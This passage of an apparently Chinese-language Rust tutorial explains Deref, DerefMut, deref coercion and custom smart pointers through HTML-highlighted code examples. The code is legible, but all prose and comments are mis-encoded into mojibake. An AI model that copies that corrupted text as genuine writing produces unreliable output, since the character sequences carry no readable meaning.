<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">value</span> = *boxed;  <span class="hljs-comment">// é”™è¯¯ï¼MyBox ä¸æ”¯æŒ *</span>
</code></pre>
<p>è¿™å°±æ˜¯ <code>Deref</code> trait çš„ç¬¬ä¸€ä¸ªä½œç”¨ï¼š<strong>è®©è‡ªå®šä¹‰ç±»å‹æ”¯æŒ <code>*</code> è¿ç®—ç¬¦</strong>ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::Deref;

<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;  <span class="hljs-comment">// è§£å¼•ç”¨åå¾—åˆ°ä»€ä¹ˆç±»å‹</span>
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>  <span class="hljs-comment">// è¿”å›å†…éƒ¨å€¼çš„å¼•ç”¨</span>
    }
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-number">5</span>);
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">value</span> = *boxed;  <span class="hljs-comment">// ç°åœ¨å¯ä»¥äº†ï¼ç­‰ä»·äº *(boxed.deref())</span>
</code></pre>
<p><strong>å…³é”®ç†è§£</strong>ï¼š<code>*boxed</code> ä¸æ˜¯ç›´æ¥æ‹¿åˆ°å€¼ï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li>è°ƒç”¨ <code>boxed.deref()</code> å¾—åˆ° <code>&amp;T</code></li>
<li>å†å¯¹è¿™ä¸ªå¼•ç”¨è§£å¼•ç”¨ï¼Œå¾—åˆ° <code>T</code></li>
</ol>
<p>æ‰€ä»¥ <code>*boxed</code> å®é™…ä¸Šæ˜¯ <code>*(boxed.deref())</code> çš„è¯­æ³•ç³–ã€‚</p>
<h3 data-id="heading-2">Deref çš„çœŸæ­£å¨åŠ›ï¼šè‡ªåŠ¨ç±»å‹è½¬æ¢</h3>
<p>ä½† <code>Deref</code> æœ€ç‰›çš„åœ°æ–¹ä¸æ˜¯ <code>*</code> è¿ç®—ç¬¦ï¼Œè€Œæ˜¯<strong>è§£å¼•ç”¨å¼ºåˆ¶è½¬æ¢</strong>ï¼ˆderef coercionï¼‰ã€‚</p>
<p>çœ‹è¿™ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_length</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"é•¿åº¦: {}"</span>, s.<span class="hljs-title function_ invoke__">len</span>());
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">my_string</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_ invoke__">print_length</span>(&amp;my_string);  <span class="hljs-comment">// &amp;String è‡ªåŠ¨è½¬ä¸º &amp;strï¼</span>
</code></pre>
<p>ä¸ºä»€ä¹ˆ <code>&amp;String</code> èƒ½ä¼ ç»™æ¥å— <code>&amp;str</code> çš„å‡½æ•°ï¼Ÿå› ä¸º <code>String</code> å®ç°äº† <code>Deref&lt;Target=str&gt;</code>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">String</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">str</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        <span class="hljs-comment">// è¿”å›å†…éƒ¨å­—ç¬¦ä¸²åˆ‡ç‰‡</span>
    }
}
</code></pre>
<p>å½“ä½ å†™ <code>print_length(&amp;my_string)</code> æ—¶ï¼ŒRust å‘ç°ï¼š</p>
<ul>
<li>ä½ ä¼ çš„æ˜¯ <code>&amp;String</code></li>
<li>å‡½æ•°è¦çš„æ˜¯ <code>&amp;str</code></li>
<li><code>String</code> å®ç°äº† <code>Deref&lt;Target=str&gt;</code></li>
</ul>
<p>äºæ˜¯ Rust è‡ªåŠ¨è°ƒç”¨ <code>my_string.deref()</code>ï¼ŒæŠŠ <code>&amp;String</code> è½¬æˆ <code>&amp;str</code>ã€‚</p>
<p><strong>è¿™æ‰æ˜¯ Deref çš„æ ¸å¿ƒä»·å€¼</strong>ï¼šè®©ä½ çš„ API æ›´çµæ´»ã€‚ä½ åªéœ€è¦å†™ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(s: &amp;<span class="hljs-type">str</span>) { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<p>è°ƒç”¨è€…å¯ä»¥ä¼ ï¼š</p>
<ul>
<li><code>&amp;str</code> å­—é¢é‡ï¼š<code>process("hello")</code></li>
<li><code>String</code>ï¼š<code>process(&amp;my_string)</code></li>
<li><code>Box&lt;str&gt;</code>ï¼š<code>process(&amp;boxed_str)</code></li>
<li><code>Rc&lt;String&gt;</code>ï¼š<code>process(&amp;rc_string)</code></li>
</ul>
<p>Rust ä¼šè‡ªåŠ¨å¸®ä½ è½¬æ¢ï¼Œä¸éœ€è¦æ‰‹åŠ¨è°ƒç”¨ <code>.as_str()</code> æˆ– <code>.deref()</code>ã€‚</p>
<h3 data-id="heading-3">DerefMutï¼šå¯å˜ç‰ˆæœ¬</h3>
<p><code>DerefMut</code> æ˜¯ <code>Deref</code> çš„å¯å˜ç‰ˆæœ¬ï¼Œè®©ä½ èƒ½ä¿®æ”¹æ™ºèƒ½æŒ‡é’ˆé‡Œçš„å€¼ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-keyword">impl</span>&lt;T&gt; DerefMut <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> T {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
boxed.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);  <span class="hljs-comment">// è‡ªåŠ¨è°ƒç”¨ deref_mut()ï¼Œç„¶åè°ƒç”¨ String::push_str</span>
</code></pre>
<p><strong>è§„åˆ™</strong>ï¼š</p>
<ul>
<li>å®ç° <code>DerefMut</code> å¿…é¡»å…ˆå®ç° <code>Deref</code></li>
<li><code>&amp;mut T</code> å¯ä»¥è‡ªåŠ¨è½¬ä¸º <code>&amp;mut U</code>ï¼ˆå¦‚æœ <code>T: DerefMut&lt;Target=U&gt;</code>ï¼‰</li>
<li><code>&amp;mut T</code> ä¹Ÿå¯ä»¥è½¬ä¸º <code>&amp;U</code>ï¼ˆå¯å˜å¼•ç”¨å¯ä»¥é™çº§ä¸ºä¸å¯å˜å¼•ç”¨ï¼‰</li>
<li>ä½† <code>&amp;T</code> <strong>ä¸èƒ½</strong>è½¬ä¸º <code>&amp;mut U</code>ï¼ˆä¸å¯å˜å¼•ç”¨ä¸èƒ½å‡çº§ä¸ºå¯å˜å¼•ç”¨ï¼‰</li>
</ul>
<h3 data-id="heading-4">å®Œæ•´ç¤ºä¾‹</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);

<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">impl</span>&lt;T&gt; DerefMut <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> T {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-comment">// ä½¿ç”¨ * è§£å¼•ç”¨</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// è¾“å‡º: hello</span>
    
    <span class="hljs-comment">// è‡ªåŠ¨è°ƒç”¨ String çš„æ–¹æ³•ï¼ˆé€šè¿‡ derefï¼‰</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"é•¿åº¦: {}"</span>, boxed.<span class="hljs-title function_ invoke__">len</span>());
    
    <span class="hljs-comment">// è‡ªåŠ¨è°ƒç”¨ String çš„å¯å˜æ–¹æ³•ï¼ˆé€šè¿‡ deref_mutï¼‰</span>
    boxed.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// è¾“å‡º: hello world</span>
}
</code></pre>
<h2 data-id="heading-5">2. è§£å¼•ç”¨å¼ºåˆ¶è½¬æ¢ï¼ˆDeref Coercionï¼‰â­</h2>
<blockquote>
<p><strong>ğŸ’¡ è¿™æ˜¯ Deref æœ€é‡è¦çš„ç‰¹æ€§ï¼</strong> å¦‚æœåªèƒ½è®°ä½ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±è®°ä½è¿™ä¸ªã€‚</p>
</blockquote>
<p>è¿™æ˜¯ <code>Deref</code> æœ€å¼ºå¤§çš„ç‰¹æ€§ï¼šRust ä¼šè‡ªåŠ¨æ’å…¥ <code>deref</code> è°ƒç”¨ï¼Œè®©ç±»å‹è½¬æ¢æ— ç¼è¿›è¡Œã€‚</p>
<h3 data-id="heading-6">è‡ªåŠ¨è½¬æ¢è§„åˆ™</h3>
<p>å½“ä½ ä¼ é€’ <code>&amp;T</code> ç»™æœŸæœ› <code>&amp;U</code> çš„å‡½æ•°æ—¶ï¼Œå¦‚æœ <code>T: Deref&lt;Target=U&gt;</code>ï¼ŒRust ä¼šè‡ªåŠ¨è½¬æ¢ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">hello</span>(name: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Hello, {}"</span>, name);
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"Rust"</span>);
    <span class="hljs-title function_ invoke__">hello</span>(&amp;s);  <span class="hljs-comment">// &amp;String è‡ªåŠ¨è½¬æ¢ä¸º &amp;str</span>
    
    <span class="hljs-comment">// ç­‰ä»·äºï¼š</span>
    <span class="hljs-comment">// hello(s.deref());  // String å®ç°äº† Deref&lt;Target=str&gt;</span>
}
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A["&amp;String"] --&gt;|"è‡ªåŠ¨è°ƒç”¨ deref()"| B["&amp;str"]
    B --&gt; C["hello(&amp;str)"]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#e8f5e9
</code></pre>
<h3 data-id="heading-7">å¤šå±‚è§£å¼•ç”¨</h3>
<p>Rust ä¼šé€’å½’è°ƒç”¨ <code>deref</code>ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…çš„ç±»å‹ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::rc::Rc;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_length</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"é•¿åº¦: {}"</span>, s.<span class="hljs-title function_ invoke__">len</span>());
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    <span class="hljs-title function_ invoke__">print_length</span>(&amp;s);  <span class="hljs-comment">// &amp;Rc&lt;String&gt; -&gt; &amp;String -&gt; &amp;str</span>
}
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A["&amp;Rc&amp;lt;String&amp;gt;"] --&gt;|"Rc::deref()"| B["&amp;String"]
    B --&gt;|"String::deref()"| C["&amp;str"]
    C --&gt; D["print_length(&amp;str)"]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e8f5e9
</code></pre>
<h3 data-id="heading-8">ä¸‰ç§å¼ºåˆ¶è½¬æ¢è§„åˆ™</h3>

























<table><thead><tr><th>ä»</th><th>åˆ°</th><th>æ¡ä»¶</th></tr></thead><tbody><tr><td><code>&amp;T</code></td><td><code>&amp;U</code></td><td><code>T: Deref&lt;Target=U&gt;</code></td></tr><tr><td><code>&amp;mut T</code></td><td><code>&amp;mut U</code></td><td><code>T: DerefMut&lt;Target=U&gt;</code></td></tr><tr><td><code>&amp;mut T</code></td><td><code>&amp;U</code></td><td><code>T: Deref&lt;Target=U&gt;</code></td></tr></tbody></table>
<p>æ³¨æ„ï¼š<strong>ä¸èƒ½</strong>ä» <code>&amp;T</code> è½¬æ¢ä¸º <code>&amp;mut U</code>ï¼ˆè¿åå€Ÿç”¨è§„åˆ™ï¼‰ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
    
    <span class="hljs-comment">// âœ… &amp;mut String -&gt; &amp;strï¼ˆå¯å˜è½¬ä¸å¯å˜ï¼‰</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span>: &amp;<span class="hljs-type">str</span> = &amp;<span class="hljs-keyword">mut</span> s;
    
    <span class="hljs-comment">// âŒ &amp;String -&gt; &amp;mut strï¼ˆä¸å¯å˜è½¬å¯å˜ï¼Œç¼–è¯‘é”™è¯¯ï¼‰</span>
    <span class="hljs-comment">// let r: &amp;mut str = &amp;s;</span>
}
</code></pre>
<h2 data-id="heading-9">3. æ ‡å‡†åº“ä¸­çš„ Deref å®ç°</h2>
<h3 data-id="heading-10">String -&gt; str</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">String</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">str</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        <span class="hljs-comment">// è¿”å›å†…éƒ¨å­—èŠ‚åˆ‡ç‰‡çš„ str å¼•ç”¨</span>
    }
}
</code></pre>
<p>è¿™è®©ä½ èƒ½æŠŠ <code>&amp;String</code> ä¼ ç»™æ¥å— <code>&amp;str</code> çš„å‡½æ•°ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">count_chars</span>(s: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
    s.<span class="hljs-title function_ invoke__">chars</span>().<span class="hljs-title function_ invoke__">count</span>()
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"ä½ å¥½"</span>);
<span class="hljs-title function_ invoke__">count_chars</span>(&amp;s);  <span class="hljs-comment">// &amp;String è‡ªåŠ¨è½¬ä¸º &amp;str</span>
</code></pre>
<h3 data-id="heading-11">Vec -&gt; [T]</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">Vec</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = [T];
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;[T] {
        <span class="hljs-comment">// è¿”å›å†…éƒ¨æ•°ç»„çš„åˆ‡ç‰‡</span>
    }
}
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(slice: &amp;[<span class="hljs-type">i32</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> {
    slice.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">sum</span>()
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-title function_ invoke__">sum</span>(&amp;v);  <span class="hljs-comment">// &amp;Vec&lt;i32&gt; è‡ªåŠ¨è½¬ä¸º &amp;[i32]</span>
</code></pre>
<h3 data-id="heading-12">Box -&gt; T</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span>&lt;T: ?<span class="hljs-built_in">Sized</span>&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">Box</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        <span class="hljs-comment">// è¿”å›å †ä¸Šå€¼çš„å¼•ç”¨</span>
    }
}
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">boxed</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">len</span> = boxed.<span class="hljs-title function_ invoke__">len</span>();  <span class="hljs-comment">// ç›´æ¥è°ƒç”¨ String çš„æ–¹æ³•</span>
</code></pre>
<h3 data-id="heading-13">Rc / Arc -&gt; T</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::rc::Rc;

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">shared</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">first</span> = shared[<span class="hljs-number">0</span>];  <span class="hljs-comment">// Rc&lt;Vec&lt;T&gt;&gt; è‡ªåŠ¨è§£å¼•ç”¨ä¸º Vec&lt;T&gt;</span>
</code></pre>
<h2 data-id="heading-14">4. å®ç°è‡ªå·±çš„æ™ºèƒ½æŒ‡é’ˆ</h2>
<p>æ ¸å¿ƒå°±ä¸‰æ­¥ï¼š</p>
<ol>
<li><strong>å®šä¹‰ç»“æ„ä½“</strong>ï¼šåŒ…è£…ä½ è¦ç®¡ç†çš„æ•°æ®</li>
<li><strong>å®ç° Deref</strong>ï¼šè¿”å›å†…éƒ¨æ•°æ®çš„å¼•ç”¨</li>
<li><strong>å®ç° DerefMut</strong>ï¼ˆå¯é€‰ï¼‰ï¼šè¿”å›å†…éƒ¨æ•°æ®çš„å¯å˜å¼•ç”¨</li>
</ol>
<h3 data-id="heading-15">æœ€ç®€å•çš„ä¾‹å­</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-comment">// 1. å®šä¹‰æ™ºèƒ½æŒ‡é’ˆ</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);

<span class="hljs-comment">// 2. å®ç° Deref</span>
<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;  <span class="hljs-comment">// è§£å¼•ç”¨åå¾—åˆ°ä»€ä¹ˆç±»å‹</span>
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>  <span class="hljs-comment">// è¿”å›å†…éƒ¨å€¼çš„å¼•ç”¨</span>
    }
}

<span class="hljs-comment">// 3. å®ç° DerefMutï¼ˆå¦‚æœéœ€è¦ä¿®æ”¹ï¼‰</span>
<span class="hljs-keyword">impl</span>&lt;T&gt; DerefMut <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> T {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>  <span class="hljs-comment">// è¿”å›å†…éƒ¨å€¼çš„å¯å˜å¼•ç”¨</span>
    }
}

<span class="hljs-comment">// ç°åœ¨å¯ä»¥åƒæ™®é€šå€¼ä¸€æ ·ä½¿ç”¨äº†ï¼</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// è§£å¼•ç”¨ï¼šhello</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, boxed.<span class="hljs-title function_ invoke__">len</span>());  <span class="hljs-comment">// è‡ªåŠ¨è°ƒç”¨ String::len()</span>
    
    boxed.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);  <span class="hljs-comment">// è‡ªåŠ¨è°ƒç”¨ String::push_str()</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// hello world</span>
}
</code></pre>
<h3 data-id="heading-16">ä¸ºä»€ä¹ˆè¦è‡ªå·±å®ç°ï¼Ÿ</h3>
<p>å®ç° Deref å¯ä»¥è®©ä½ çš„ç±»å‹ï¼š</p>
<ol>
<li><strong>åƒæ™®é€šå€¼ä¸€æ ·ä½¿ç”¨</strong>ï¼šè°ƒç”¨å†…éƒ¨ç±»å‹çš„æ–¹æ³•</li>
<li><strong>è‡ªåŠ¨ç±»å‹è½¬æ¢</strong>ï¼šä¼ ç»™æ¥å—å¼•ç”¨çš„å‡½æ•°</li>
<li><strong>æ·»åŠ é¢å¤–åŠŸèƒ½</strong>ï¼šåœ¨ä¸æ”¹å˜ä½¿ç”¨æ–¹å¼çš„å‰æä¸‹å¢å¼ºåŠŸèƒ½</li>
</ol>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::Deref;

<span class="hljs-comment">// ä¾‹å­ï¼šå¸¦æ—¥å¿—çš„æ™ºèƒ½æŒ‡é’ˆ</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Logged</span>&lt;T&gt; {
    value: T,
    access_count: std::cell::Cell&lt;<span class="hljs-type">usize</span>&gt;,  <span class="hljs-comment">// è®°å½•è®¿é—®æ¬¡æ•°</span>
}

<span class="hljs-keyword">impl</span>&lt;T&gt; Logged&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(value: T) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"åˆ›å»º Logged åŒ…è£…"</span>);
        Logged {
            value,
            access_count: std::cell::Cell::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">0</span>),
        }
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">access_count</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
        <span class="hljs-keyword">self</span>.access_count.<span class="hljs-title function_ invoke__">get</span>()
    }
}

<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">Logged</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        <span class="hljs-comment">// æ¯æ¬¡è®¿é—®éƒ½è®°å½•</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">count</span> = <span class="hljs-keyword">self</span>.access_count.<span class="hljs-title function_ invoke__">get</span>();
        <span class="hljs-keyword">self</span>.access_count.<span class="hljs-title function_ invoke__">set</span>(count + <span class="hljs-number">1</span>);
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"è®¿é—®ç¬¬ {} æ¬¡"</span>, count + <span class="hljs-number">1</span>);
        &amp;<span class="hljs-keyword">self</span>.value
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">logged</span> = Logged::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-comment">// åƒæ™®é€š String ä¸€æ ·ä½¿ç”¨ï¼Œä½†æ¯æ¬¡è®¿é—®éƒ½æœ‰æ—¥å¿—</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"é•¿åº¦: {}"</span>, logged.<span class="hljs-title function_ invoke__">len</span>());  <span class="hljs-comment">// è®¿é—®ç¬¬ 1 æ¬¡</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"å¤§å†™: {}"</span>, logged.<span class="hljs-title function_ invoke__">to_uppercase</span>());  <span class="hljs-comment">// è®¿é—®ç¬¬ 2 æ¬¡</span>
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"æ€»å…±è®¿é—®äº† {} æ¬¡"</span>, logged.<span class="hljs-title function_ invoke__">access_count</span>());
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼šé€šè¿‡ Derefï¼Œ<code>Logged&lt;String&gt;</code> å¯ä»¥åƒ <code>String</code> ä¸€æ ·è°ƒç”¨ <code>.len()</code>ã€<code>.to_uppercase()</code> ç­‰æ–¹æ³•ï¼ŒåŒæ—¶è¿˜èƒ½è®°å½•è®¿é—®æ¬¡æ•°ã€‚ç”¨æˆ·ä¸éœ€è¦å†™ <code>logged.value.len()</code>ï¼Œä»£ç æ›´ç®€æ´ã€‚</p>
